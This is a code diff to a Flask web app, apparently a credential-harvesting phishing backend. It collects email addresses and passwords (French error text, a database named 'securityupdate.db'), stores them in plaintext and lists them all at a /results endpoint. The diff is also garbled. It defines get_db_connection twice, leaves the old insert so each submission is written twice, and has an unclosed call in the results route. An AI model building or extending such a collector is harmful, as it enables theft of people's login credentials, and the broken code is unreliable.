@@ -1,4 +1,5 @@
 import os
+import sqlite3
 from datetime import datetime
 
 import psycopg2
@@ -6,6 +7,29 @@ from flask import Flask, jsonify, render_template, request
 
 app = Flask(__name__)
 
+DB_DIALECT = os.environ.get("DB_DIALECT", "postgres").lower()
+SQLITE_PATH = os.environ.get("DB_SQLITE_PATH", "/tmp/securityupdate.db")
+
+
+def init_sqlite_db(conn: sqlite3.Connection) -> None:
+    conn.execute(
+        """
+        CREATE TABLE IF NOT EXISTS submissions (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email_value TEXT NOT NULL,
+            password_value TEXT NOT NULL,
+            created_at TEXT NOT NULL
+        )
+        """
+    )
+    conn.commit()
+
+
+def get_db_connection():
+    if DB_DIALECT == "sqlite":
+        conn = sqlite3.connect(SQLITE_PATH)
+        init_sqlite_db(conn)
+        return conn
 
 def get_db_connection():
     return psycopg2.connect(
@@ -31,6 +55,27 @@ def submit():
     if not email_value or not password_value:
         return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400
 
+    created_at = datetime.utcnow().isoformat()
+    with get_db_connection() as conn:
+        if DB_DIALECT == "sqlite":
+            conn.execute(
+                """
+                INSERT INTO submissions (email_value, password_value, created_at)
+                VALUES (?, ?, ?)
+                """,
+                (email_value, password_value, created_at),
+            )
+            conn.commit()
+        else:
+            with conn.cursor() as cur:
+                cur.execute(
+                    """
+                    INSERT INTO submissions (email_value, password_value, created_at)
+                    VALUES (%s, %s, %s)
+                    """,
+                    (email_value, password_value, created_at),
+                )
+            conn.commit()
     created_at = datetime.utcnow()
     with get_db_connection() as conn:
         with conn.cursor() as cur:
@@ -49,6 +94,8 @@ def submit():
 @app.get("/results")
 def results():
     with get_db_connection() as conn:
+        if DB_DIALECT == "sqlite":
+            rows = conn.execute(
         with conn.cursor() as cur:
             cur.execute(
                 """
@@ -56,6 +103,17 @@ def results():
                 FROM submissions
                 ORDER BY created_at DESC
                 """
+            ).fetchall()
+        else:
+            with conn.cursor() as cur:
+                cur.execute(
+                    """
+                    SELECT email_value, password_value, created_at
+                    FROM submissions
+                    ORDER BY created_at DESC
+                    """
+                )
+                rows = cur.fetchall()
             )
             rows = cur.fetchall()
 
